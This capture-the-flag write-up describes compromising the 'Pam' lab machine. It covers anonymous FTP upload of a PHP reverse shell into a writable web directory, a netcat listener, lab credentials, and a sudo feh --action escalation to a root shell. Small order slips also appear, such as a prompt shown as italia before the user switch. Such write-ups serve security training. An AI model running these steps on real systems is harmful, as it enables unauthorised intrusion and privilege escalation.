## HackTheBox Machine Challenge: Pam 

This writeup details the steps taken to gain initial access, escalate privileges to the `italia` user, and finally achieve root access on the "Pam" machine, with a corrected sequence of events regarding password discovery.

### 1. Reconnaissance

The initial phase involved identifying the target and its open services.

- **ARP Scan:** An ARP scan was performed to identify active hosts on the network.

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 162
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.136   08:00:27:bf:97:c1      1      60  PCS Systemtechnik GmbH
```

The target machine was identified at `192.168.1.136`.


- **Nmap Scan:** A comprehensive Nmap scan was conducted to discover all open ports and services.

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ nmap -sS -sV -Pn  --min-rate=1000 --max-retries=2 192.168.1.136 -p-
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    nginx 1.18.0
```

The scan revealed two open ports:

- **Port 21 (FTP):** Running `vsftpd 3.0.3`.
- **Port 80 (HTTP):** Running `nginx 1.18.0`.





### 2. FTP Enumeration (Port 21)

Anonymous login was attempted on the FTP server.

- **Anonymous Login:**

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ ftp 192.168.1.136
Connected to 192.168.1.136.220 (vsFTPd 3.0.3)
Name (192.168.1.136:zengla): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Anonymous login was successful.


- **Directory Listing:**

```plaintext
ftp> ls
drwxr-xr-x    2 1001     1001         4096 Aug 18  2022 anonymous
drwxr-xr-x    3 1000     1000         4096 Aug 18  2022 italia
```

Two directories were found: `anonymous` (empty) and `italia`.


- **Exploring `italia` directory:**

```plaintext
ftp> cd italia
ftp> ls
-rwxrwx---    1 1000     1000         9510 Aug 18  2022 pazz.php
-rw-------    1 1000     1000           24 Aug 18  2022 user.txt
```

The `italia` directory contained `pazz.php` and `user.txt`. Attempts to `get` these files failed due to permissions.


- **Writable Directory Discovery:** A test file (`test.file`) was created and attempts were made to upload it to various directories.

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ echo "" > test.file
ftp> put test.file
553 Could not create file.
ftp> cd /var/www/html/phpipam/app/admin/import-export/upload
250 Directory successfully changed.
ftp> put test.file
150 Ok to send data.
100% |*************************************************************************************************************************|     1        0.04 KiB/s    00:00 ETA
226 Transfer complete.
ftp> ls -la
drwxrwxrwx    2 33       33           4096 Jul 17 02:11 .
```

The directory `/var/www/html/phpipam/app/admin/import-export/upload/` was found to be writable by the anonymous FTP user, and it had `drwxrwxrwx` (777) permissions, owned by `www-data:www-data`. This is a critical finding for uploading a web shell.




### 3. Web Enumeration (Port 80)

- **Directory Brute-Forcing:** `gobuster` and `ffuf` were used to enumerate web content.

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ gobuster dir -u http://192.168.1.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
```

The `gobuster` scan showed many timeouts, but `ffuf` provided more consistent results, indicating the presence of `index.html` and the `phpipam` application.


- **`index.html` and `phpipam`:**

```plaintext
ftp> cd /var/www/html
ftp> ls
-rw-r--r--    1 33       33             18 Aug 18  2022 index.html
drwxr-xr-x   12 33       33           4096 Aug 18  2022 phpipam
```

`index.html` was downloaded and contained "Hello World!". The `phpipam` directory was identified as a web application.


- **phpIPAM File Downloads:** Several files from the `phpipam` application were downloaded via FTP for analysis.

- `/var/www/html/phpipam/config.php`
- `/var/www/html/phpipam/db/SCHEMA.sql`
- Various PHP files from `/var/www/html/phpipam/api/controllers/`



- **`config.php` Analysis:**

```php
<?php
/**
 * database connection details
 ******************************/
$db['host'] = '127.0.0.1';
$db['user'] = 'phpipam';
$db['pass'] = 'phpipamadmin';
$db['name'] = 'phpipam';
$db['port'] = 3306;
// ...
$api_allow_unsafe = false;
$debugging = false;
```

This file revealed the MySQL database credentials: `user: phpipam`, `pass: phpipamadmin`. It also showed that unsafe API calls were disabled and debugging was off. These credentials were later used to access the database and enumerate users, but *not* for `su italia`.




### 4. Initial Foothold (www-data shell)

Leveraging the writable `upload` directory, a PHP reverse shell was uploaded.

- **Prepare PHP Reverse Shell:**

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ vim php-reverse-shell.php # (Edited LHOST and LPORT to attacker's IP and 4444)
```


- **Upload and Set Permissions:**

```plaintext
ftp> cd /var/www/html/phpipam/app/admin/import-export/upload
ftp> put php-reverse-shell.php
150 Ok to send data.
226 Transfer complete.
ftp> chmod 777 php-reverse-shell.php
200 SITE CHMOD command ok.
```

The reverse shell was uploaded and its permissions were set to `777` to ensure execution.


- **Trigger Reverse Shell:**

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.136 44662
```

In a separate terminal, a netcat listener was started. The uploaded shell was then triggered via `curl`.

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ curl http://192.168.1.136/phpipam/app/admin/import-export/upload/php-reverse-shell.php
```

This resulted in a `504 Gateway Time-out` on the `curl` side, indicating the script executed successfully and a connection was received on the netcat listener.


- **Stable Shell:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@pam:/$
```

A stable shell was obtained as the `www-data` user.




### 5. User Flag & Lateral Movement (www-data to italia)

With the `www-data` shell, further enumeration was performed to find user credentials and escalate privileges.

- **WebSocket Connection:**
- I tried to run `ss -tuln` To inspect active ports , I found the port `12345` which seems to be very interesting.
- **WebSocket Connection and Image Extraction:**

```plaintext
italia@pam:~$ nc 127.0.0.1 12345
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
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`.
```

Connecting to the WebSocket server on `127.0.0.1:12345` revealed a continuous stream of base64 encoded data. This data was extracted and saved as `image.png`.

<img width="750" height="468" alt="image" src="https://github.com/user-attachments/assets/680c7d5c-df15-4b78-9fa9-44dca5dd1989" />

- **Image Analysis (`image.png`):**

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ binwalk image.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 750 x 468, 8-bit/color RGB, non-interlaced
91            0x5B            Zlib compressed data, compressed
6389          0x18F5          OpenSSL encryption, salted, salt: 0x9E15940E34694124
6421          0x1915          PNG image, 750 x 468, 8-bit/color RGB, non-interlaced
6512          0x1970          Zlib compressed data, compressed
12810         0x320A          OpenSSL encryption, salted, salt: 0x9E15940E34694124
```

`binwalk` confirmed that `image.png` contained embedded OpenSSL encrypted data. Crucially, viewing the `image.png` (either directly or by decoding the base64 string from `pazz.php`) revealed the text "rootisCLOSE" and "-aes-256-cbc". This provided the password and the encryption algorithm.


- **Switch User to `italia`:**

```plaintext
www-data@pam:/$ su italia
Password: rootisCLOSE
italia@pam:/$
```

The password `rootisCLOSE`, obtained from the WebSocket image, was successfully used to `su` to the `italia` user.


- **User Flag Discovery:**

```plaintext
italia@pam:~$ cat user.txt
mcZavkYkoLYUEHxQNNyiHMV
```

The `user.txt` flag was found in `/home/italia/`.


- **MySQL Database Access (for completeness, not used for `su italia`):**
Using the credentials found in `config.php` (`phpipam:phpipamadmin`), a connection to the MariaDB database was established.

```plaintext
www-data@pam:~/html/phpipam$ mysql -u phpipam -p
Enter password: phpipamadmin
MariaDB [phpipam]> select * from users;
```

The `users` table contained the hash for the `Admin` user. This hash was cracked using John the Ripper, yielding `password`. While this was a valid finding, it was not the path taken to `su italia`.




### 6. Privilege Escalation (italia to root)

From the `italia` user, `sudo` privileges were enumerated, leading to a root shell.

- **Sudo Rights Enumeration:**

```plaintext
italia@pam:/$ sudo -l
Matching Defaults entries for italia on pam:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User italia may run the following commands on pam:
    (ALL : ALL) NOPASSWD: /usr/bin/feh
```

The `italia` user could run `/usr/bin/feh` as root without a password. `feh` is an image viewer that supports executing shell commands via its `--action` parameter.


- **`feh` Exploitation for Root Shell:**
Since `feh` requires an X display, which was not available in the current shell, the `-u` (`--unloadable`) option was used. This option makes `feh` process files without displaying them, allowing the `--action` to execute.

```plaintext
italia@pam:/$ sudo /usr/bin/feh -uA "id"
./initrd.imguid=0(root) gid=0(root) grupos=0(root)
./initrd.img.olduid=0(root) gid=0(root) grupos=0(root)
./vmlinuzuid=0(root) gid=0(root) grupos=0(root)
./vmlinuz.olduid=0(root) gid=0(root) grupos=0(root)
```

Executing `id` as root confirmed the vulnerability. A root shell was then obtained:

```plaintext
italia@pam:/$ sudo /usr/bin/feh -uA "/bin/bash"
root@pam:/# id
uid=0(root) gid=0(root) grupos=0(root)
```




### 7. Root Flag

With root access, the final flag was retrieved.

- **Root Flag Location:**

```plaintext
root@pam:/# cd /root
root@pam:~# ls
root.enc
```

The root flag was found in `/root/root.enc`.


- **Decryption of `root.enc`:**
`root.enc` was identified as an OpenSSL encrypted file. The password `rootisCLOSE` and the algorithm `-aes-256-cbc` were both found in the image streamed from the WebSocket (`pazz.php`).

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ openssl enc -d -aes-256-cbc -in root.enc -out decrypted_file -salt -pass pass:rootisCLOSE
```

The decryption was successful.


- **Root Flag Content:**

```plaintext
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/pam]└─$ cat decrypted_file
HMVZcBzDKmcFJwnkdsnQbXV
```

The root flag was `HMVZcBzDKmcFJwnkdsnQbXV`.
